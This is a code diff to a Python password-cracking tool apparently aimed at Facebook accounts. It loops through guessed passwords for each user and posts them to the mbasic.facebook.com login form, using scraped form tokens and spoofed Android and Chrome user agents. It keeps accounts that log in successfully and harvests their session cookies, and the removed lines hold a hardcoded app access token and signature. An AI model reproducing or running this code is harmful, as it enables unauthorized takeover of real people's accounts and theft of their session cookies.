@@ -411,27 +411,34 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
+				url =  ("mbasic.facebook.com")
+				r = ses.get(f"https://{url}/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl")
 				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": user,
-					"locale": "ja_JP",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
+					'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1), 
+                 'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
+                 'm_ts': re.search('name="m_ts" value="(.*?)"',str(r.text)).group(1), 
+                 'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
+                 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'masked_cp': '', 'pass': pw,'login': 'Masuk', 'bi_xrwh': '0'}
 				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": Session().generate_ugent(),
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+					"Host": url,
+                "content-length": "200",
+                "cache-control": "max-age=0",
+                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "upgrade-insecure-requests": '"1"',
+                "origin": "https://"+url,
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": ua,
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-user": "?1",
+                "sec-fetch-dest": "document",
+				"referer": "https://"+url+"/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				post = ses.post(f"https://{url}/login/device-based/regular/login/?next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=101&ref=dbl",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
@@ -580,7 +587,7 @@ class Session:
 		versi_android = random.randint(4,12)
 		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
 		versi_app = random.randint(410000000,499999999)
-		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; Redmi 6A Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Redmi 6A ;FBBD/Redmi;FBDV/Redmi 2019;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
+		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
 		return ugent
 		
 if __name__=="__main__":
